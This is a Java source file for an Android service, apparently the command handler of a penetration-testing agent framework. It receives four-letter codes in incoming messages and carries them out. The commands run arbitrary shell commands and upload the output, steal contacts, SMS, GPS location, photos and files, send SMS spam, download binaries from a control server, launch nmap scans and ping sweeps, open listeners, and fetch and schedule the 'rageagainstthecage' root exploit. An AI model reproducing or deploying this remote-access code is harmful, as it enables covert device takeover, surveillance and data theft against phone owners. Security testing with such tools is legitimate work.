package com.bulbsecurity.framework;


import java.io.File;
import java.io.FileOutputStream;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import android.app.AlarmManager;
import android.app.PendingIntent;
import java.util.Calendar;
public class CommandHandler extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		Log.i("AAA", "Started handler");
                String show = "SHOW";		 
		String spam = "SPAM";
		String smss = "SMSS";
		String cont = "CONT";
		String pict = "PICT";
		String root = "ROOT";
		String gps = "GGPS";
		String attach = "ATTA";
		String ping = "PING";
		String download = "DOWN";
		String exec = "EXEC";
		String listener = "LIST";
		String porter = "PORT";
		String upload = "UPLD";
		String nmap = "NMAP";
		String exup = "EXUP";
		String uapp = "UAPK";
		String gtip = "GTIP";
		File exynos = new File("/dev/exynos-mem");
		String body = intent.getStringExtra("message");
		
		if (body.length() >= 12)
		{
			
			String checkfunction = body.substring(8,12);
			if (checkfunction.equals(uapp))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String file = aString[2];
					        Intent intent2 = new Intent(getApplicationContext(),Upload.class);
						intent2.putExtra("file",file);
						intent2.putExtra("app", "yes");
						 Context context = getApplicationContext();
                                        context.startService(intent2);	
			}
			}
				if (checkfunction.equals(show))
			{
				String message = "This has been a Security Awareness Test by your Company.Please visit http://www.xxx.com/awarenesstraining.html for moreinformation. ";
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
			
					message = aString[2];
					for (int j = 3; j < aString.length; j++)
					{
						message += " ";
						message += aString[j];
					}
				}
                                if (message.equals("blank"))
				{
					message = "This has been a Security Awareness Test by your Company.Please visit http://www.xxx.com/awarenesstraining.html for moreinformation. ";

				}
				
					Intent intent2 = new Intent(getApplicationContext(),ToastService.class);
					intent2.putExtra("message",message);
			Context context = getApplicationContext();
					context.startService(intent2);
			}
			if (checkfunction.equals(exup))
			{

					String aString[] = body.split(" ");
                          

					String filedir = getFilesDir().toString();
					Intent intent9 = new Intent(getApplicationContext(), Execute.class);
					if (aString.length >= 4)
					{
					String command = aString[3];
					for (int j = 4; j < aString.length; j++)
					{
						command += " ";
						command += aString[j];
					}
				String downloaded = aString[2];
				intent9.putExtra("command", command);
				intent9.putExtra("downloaded", downloaded);
				Context context3 = getApplicationContext();
				context3.startService(intent9);
			        Intent intent2 = new Intent(getApplicationContext(),Upload.class);
				String file = filedir.concat("/commandoutput.txt");
				intent2.putExtra("file",file);
				intent2.putExtra("app","no");
				AlarmManager alarm = (AlarmManager) context3.getSystemService(Context.ALARM_SERVICE);
				PendingIntent pending = PendingIntent.getService(context3, 0, intent2, 0);
				Calendar cal = Calendar.getInstance();
         			cal.add(Calendar.SECOND, 60);
				alarm.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pending);

			}
			}
			if (checkfunction.equals(nmap))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String targets = aString[2];
					for (int j = 3; j < aString.length; j++)
					{
						targets += " ";
						targets += aString[j];
					}
				Log.i("AAAA", targets);
				Intent intent8 = new Intent(getApplicationContext(), Download.class);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String file = "/nmap";
				intent8.putExtra("path", path);
				intent8.putExtra("filename", file);
				Context context3 = getApplicationContext();
				context3.startService(intent8);
				Intent intent5 = new Intent(getApplicationContext(), Download.class);
				file = "/nmap-services";
				intent5.putExtra("path", path);
				intent5.putExtra("filename", file);
				context3.startService(intent5);
				//Intent intent9 = new Intent(getApplicationContext(), Download.class);
                                //file = "/nse_main.lua";
                                //intent9.putExtra("path", path);
                                //intent9.putExtra("filename", file);
                                //context3.startService(intent9);
				Intent intent6 = new Intent(getApplicationContext(), Execute.class);
				String filedir = getFilesDir().toString();
				String command = "nmap -sT ".concat(targets).concat(" -oA ").concat(filedir).concat("/nmapoutput"); 
				String downloaded = "yes";
				intent6.putExtra("command", command);
				intent6.putExtra("downloaded", downloaded);
			        Intent intent2 = new Intent(getApplicationContext(),Upload.class);
				file = filedir.concat("/nmapoutput.nmap");
				intent2.putExtra("file",file);
				intent2.putExtra("app", "no");
				AlarmManager alarm = (AlarmManager) context3.getSystemService(Context.ALARM_SERVICE);
				PendingIntent pending = PendingIntent.getService(context3, 0, intent6, 0);
				PendingIntent pending2 = PendingIntent.getService(context3, 0, intent2, 0);
				Calendar cal = Calendar.getInstance();
         			cal.add(Calendar.SECOND, 30);
				Calendar cal2 = Calendar.getInstance();
         			cal2.add(Calendar.SECOND, 120);
				alarm.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pending);
 				alarm.set(AlarmManager.RTC_WAKEUP, cal2.getTimeInMillis(), pending2);



				}
			}
			if (checkfunction.equals(upload))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String file = aString[2];
					        Intent intent2 = new Intent(getApplicationContext(),Upload.class);
						intent2.putExtra("file",file);
						intent2.putExtra("app", "no");
						 Context context = getApplicationContext();
                                        context.startService(intent2);


				}
			}
			if (checkfunction.equals(spam))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 4)
				{
					String number = aString[2];
					String message = aString[3];
					for (int j = 4; j < aString.length; j++)
					{
						message += " ";
						message += aString[j];
					}
	Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
					intent2.putExtra("number",number);
					intent2.putExtra("message",message);
			Context context = getApplicationContext();
					context.startService(intent2);
					
					
				}

				
			}
			
			else if (checkfunction.equals(attach)) {
	
						String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), Checkin.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			

				
			
			}
			
			else if (checkfunction.equals(download)) {
				String aString[] = body.split(" ");
				Intent intent4 = new Intent(getApplicationContext(), Download.class);
				if (aString.length >= 4)
				{
				String path = aString[2];
				String file = aString[3];
				intent4.putExtra("path", path);
				intent4.putExtra("filename", file);
				Context context3 = getApplicationContext();
				context3.startService(intent4);
				}
				
				
		
		}
			else if (checkfunction.equals(listener)) {
				String aString[] = body.split(" ");
				Intent intent4 = new Intent(getApplicationContext(), Listener.class);
				if (aString.length >= 4)
				{
				int port = Integer.parseInt(aString[2]);
				String returnmethod = aString[3];
				intent4.putExtra("port", port);
				intent4.putExtra("return", returnmethod);
				Context context3 = getApplicationContext();
				context3.startService(intent4);
				}
			}
			else if (checkfunction.equals(exec)) {
				String aString[] = body.split(" ");
				Intent intent4 = new Intent(getApplicationContext(), Execute.class);
				if (aString.length >= 4)
				{
				String command = aString[3];
				for (int j = 4; j < aString.length; j++)
				{
					command += " ";
					command += aString[j];
				}
				String downloaded = aString[2];
				intent4.putExtra("command", command);
				intent4.putExtra("downloaded", downloaded);
				Context context3 = getApplicationContext();
				context3.startService(intent4);
				}
		
		}
			
			else if (checkfunction.equals(smss)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), SMSGet.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(gtip)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), IPGet.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(ping)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), PingSweep.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(gps)) {			 
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), GetGPS.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(cont)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(),ContactsGet.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			}
			

			else if (checkfunction.equals(pict)) {
				String returnvalue = null;
				Intent intent4 = new Intent(getApplicationContext(), PictureService.class);
				intent4.putExtra("returnvalue",returnvalue);
				Context context4 = getApplicationContext();
				context4.startService(intent4);
				
			}
			else if (checkfunction.equals(porter)) {
				Log.i("GGG", "PORTER");
				String aString[] = body.split(" ");

				if (aString.length >= 4)
				{
				 String file = aString[2];
				 
				    FileOutputStream fos;

				    Log.i("GGG", file);
		    	    
		    	    String message = aString[3];
					for (int j = 4; j < aString.length; j++)
					{
						message += " ";
						message += aString[j];
					}
				   
					Log.i("FFF", message);
				    try {
				    
				        fos = openFileOutput(file, Context.MODE_APPEND);
				        fos.write(message.getBytes());
				        fos.close();
				    } catch (Exception e) {
				        e.printStackTrace();

				    }

				}
				
			}
			
			else if (checkfunction.equals(root)){
			Log.i("AAAA","ROOT");
 String aString[] = body.split(" ");
                                if (aString.length >= 3)
                                {
                                        String method = aString[2];
					if (method.equals("rageagainstthecage"))
					
						if (Build.VERSION.SDK_INT <= 8)
						{
							Log.i("AAAA","trying RageAgainsttheCage");
									Intent intent8 = new Intent(getApplicationContext(), Download.class);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String file = "/rageagainstthecage";
				intent8.putExtra("path", path);
				intent8.putExtra("filename", file);
				Context context3 = getApplicationContext();
				context3.startService(intent8);

								Intent intent9 = new Intent(getApplicationContext(), Phase1.class);
							
								AlarmManager alarm = (AlarmManager) context3.getSystemService(Context.ALARM_SERVICE);
				PendingIntent pending = PendingIntent.getService(context3, 0, intent9, 0);
				
				Calendar cal = Calendar.getInstance();
         			cal.add(Calendar.SECOND, 30);
				alarm.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pending);

					//		Intent intent9 = new Intent(getApplicationContext(), Phase1.class);
					//		Context context4 = getApplicationContext();
					//		context4.startService(intent9);
						}
						//else if (exynos.exists())
						//{
						//	Intent intent10 = new Intent(getApplicationContext(), Exynos.class);
						//	Context context5 = getApplicationContext();
						//	context5.startService(intent10);
						//}
				}}
			}
			
		}
			
		
				
		
	
	
	@Override
	public void onDestroy() {
		
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}


